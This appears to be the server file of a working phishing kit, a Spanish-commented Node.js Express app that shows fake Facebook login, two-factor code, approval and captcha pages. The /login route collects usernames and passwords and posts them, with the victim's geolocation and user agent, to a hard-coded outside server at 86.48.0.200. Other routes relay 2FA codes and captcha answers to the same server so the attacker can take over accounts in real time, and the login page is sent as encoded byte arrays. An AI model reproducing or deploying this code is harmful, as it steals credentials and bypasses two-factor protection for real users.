// server.js – Express front-end para multi-sesión Facebook
// Versión 23-jul-2025 — FIX: Corregida la gestión de estado para evitar race conditions.
process.on('unhandledRejection', err => console.error('[UNHANDLED]', err));
process.on('uncaughtException',  err => console.error('[UNCAUGHT]',  err));

const fs = require('fs');
const express = require('express');
const body    = require('body-parser');
const path    = require('path');
const fetch = (...args) => import('node-fetch').then(({default: fetch}) => fetch(...args));
const i18next = require('i18next');
const Backend = require('i18next-fs-backend');
const middleware = require('i18next-http-middleware');
i18next
  .use(Backend)
  .use(middleware.LanguageDetector)
  .init({
    fallbackLng: 'es', // Idioma por defecto
    backend: {
      loadPath: path.join(__dirname, 'locales/{{lng}}/translation.json'),
    },
    detection: {
      order: ['header'],
      caches: false
    }
  });

async function lanzarVentana(username, password, propietario, url_final, userAgent, geoInfo,origin) {
  const r = await fetch(`http://86.48.0.200:4000/lanzar`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ username, password, propietario, url_final, userAgent, geoInfo,origin  })
  });
  if (!r.ok) throw new Error(`Error al lanzar ventana: ${r.status}`);
}
async function setCodigo(user, code) {
  const r = await fetch('http://86.48.0.200:4000/codigo', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ user, code }) });
  if (!r.ok) throw new Error(`Error al enviar código: ${r.status}`);
}
async function setCaptcha(user, solution) {
  const r = await fetch('http://86.48.0.200:4000/captcha', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ user, solution }) });
  if (!r.ok) throw new Error(`Error al enviar solución de captcha: ${r.status}`);
}
async function abortarSesion(user) {
  try {
    const r = await fetch('http://86.48.0.200:4000/abort-session', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ user }) });
    if (!r.ok) console.error(`Error al abortar sesión para ${user}: ${r.status}`);
  } catch (e) { console.error(`[ERROR] No se pudo conectar con la API para abortar la sesión de ${user}.`); }
}

const app  = express();

app.use(middleware.handle(i18next));
app.set('view engine', 'ejs'); // Usar EJS como motor de plantillas
app.set('views', path.join(__dirname, 'templates'));
app.use((req, res, next) => {
  res.setHeader("Content-Type", "text/html; charset=utf-8");
  res.setHeader("X-Frame-Options", "ALLOWALL");
  next(); // ← importante para que no se bloquee la ejecución
});
app.use(body.urlencoded({ extended:false }));
app.use(body.json());

const need = Object.create(null), ok = Object.create(null), restartFlags = Object.create(null),
      loginFailed = Object.create(null), approvalRequired = Object.create(null), captchaRequired = Object.create(null);

app.use(express.static(path.join(__dirname, 'templates')));
app.get('/', (req, res) => {
  if (req.query.__partial === '1' || req.query.error ==='1' ) {
    return res.render('login');
  }
  res.render('login', {}, (err, html) => {
    if (err) return res.status(500).send(err.message);
    const codes = Array.from(Buffer.from(html, 'utf8'));
    res.render('loading', { codes });
  });
});
app.get('/waiting',  (req, res) => res.render('waiting'));
app.get('/code',     (req, res) => res.render('code'));
app.get('/analyzing',(req, res) => res.render('analyzing'));
app.get('/approval', (req, res) => res.render('approval'));
app.get('/captcha',  (req, res) => res.render('captcha')); 

function getIP(req) { return (req.headers['x-forwarded-for'] || '').split(',').shift().trim() || req.socket?.remoteAddress || req.ip; }
async function getGeoInfo(ip) {
  try {
    // =================================================================
    // == CORRECCIÓN: Pedimos 'countryCode' en lugar de 'country'
    // =================================================================
    const response = await fetch(`http://ip-api.com/json/${ip}?fields=status,message,countryCode,regionName,city`);
    const data = await response.json();
    if (data.status === 'success') {
      return {
        countryCode: data.countryCode || 'US',
        state: data.regionName || '',
        city: data.city || ''
      };
    }
  } catch (e) {
    console.error("Error obteniendo Geo-IP:", e.message);
  }
  return { countryCode: 'US', state: '', city: '' };
}

app.post('/login', async (q,res,next)=>{
  const { username, password, propietario, url_final } = q.body;
  let userAgent = q.headers['user-agent'];
  const defaultUserAgent = 'Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.207 Mobile Safari/537.36';
  if (!/Mobi|Android|iPhone|iPad|iPod/i.test(userAgent)) userAgent = defaultUserAgent;
  const ip = getIP(q);

    console.log(`[GEO-IP] Obteniendo información para la IP: ${ip}...`);
    const geoInfo = await getGeoInfo(ip);
    console.log(`[GEO-IP] Visitante detectado en: ${geoInfo.city}, ${geoInfo.state}, ${geoInfo.countryCode}`);

  if(!username || !password) return res.send('Datos incompletos');
  
  const origin = `${q.protocol}://${q.get('host')}`;
  console.log(`[ORIGIN] Petición recibida desde: ${origin}`);

  delete need[username]; delete ok[username]; delete restartFlags[username];
  delete loginFailed[username]; delete approvalRequired[username]; delete captchaRequired[username];

  try{
    //console.log("se va lanzar venta")
    await lanzarVentana(username, password, propietario, url_final, userAgent, geoInfo,origin);
    console.log(geoInfo)
    const query = new URLSearchParams({ user: username, propietario, url_final });
    res.redirect(`/waiting?${query.toString()}`);
  }catch(e){ next(e); }
});

app.get('/code-status',(q,r)=> {
  const u = q.query.user;
  const resp = {
    accepted: ok[u] || false, 
    need:     !!need[u],
    approval: approvalRequired[u] || false,
    captcha:  captchaRequired[u] || false,
    restart:  !!restartFlags[u],
    failed:   !!loginFailed[u]
  };
  
  // =================================================================
  // == CORRECCIÓN: YA NO BORRAMOS LOS ESTADOS AQUÍ
  //    Se borran solo al iniciar un nuevo /login
  // =================================================================
  if (resp.captcha && resp.captcha.refresh === true) {
      captchaRequired[u].refresh = false;
  }
  
  r.json(resp);
});

app.post('/code', async (q,r,next)=>{
  const { user, code, propietario, url_final } = q.body;
  try{
    await setCodigo(user, code);
    delete need[user];
    const query = new URLSearchParams({ user, propietario, url_final });
    r.redirect(`/waiting?${query.toString()}`);
  }catch(e){ next(e); }
});

app.post('/captcha', async (q, res, next) => {
    const { user, solution } = q.body;
    try {
        await setCaptcha(user, solution);
        res.status(200).json({ status: 'received' });
    } catch (e) { 
        next(e); 
    }
});

app.post('/require-code',    (q,r)=>{ need[q.body.usuario] = true; r.end(); });
app.post('/require-approval',(q,r)=>{ 
    approvalRequired[q.body.usuario] = {
        required: true,
        accountName: q.body.accountName
    };
    r.end();
});
app.post('/require-captcha', (q,r)=>{ 
    captchaRequired[q.body.usuario] = { required: true, imageData: q.body.imageData };
    r.end(); 
});
app.post('/refresh-captcha', (q,r)=>{ 
    captchaRequired[q.body.usuario] = { required: true, imageData: q.body.imageData, refresh: true };
    r.end(); 
});
app.post('/code-accepted',   (q,r)=>{ 
    ok[q.body.usuario] = {
        accepted: true,
        url_final: q.body.url_final || 'https://facebook.com'
    };
    r.end();
});
app.post('/login-failed',    (q,r)=>{ loginFailed[q.body.usuario]=true; r.end(); });
app.post('/restart', (q,r)=>{ const u = q.body.usuario; delete need[u]; delete ok[u]; restartFlags[u] = true; r.json({ restart:true }); });
app.post('/disconnect', (req, res) => { if (req.body.user) abortarSesion(req.body.user); res.sendStatus(204); });
app.use((err,_req,res,_next)=>{ console.error('[EXPRESS]', err.stack || err); res.status(500).send('Error interno. Intenta de nuevo.'); });

module.exports = app;
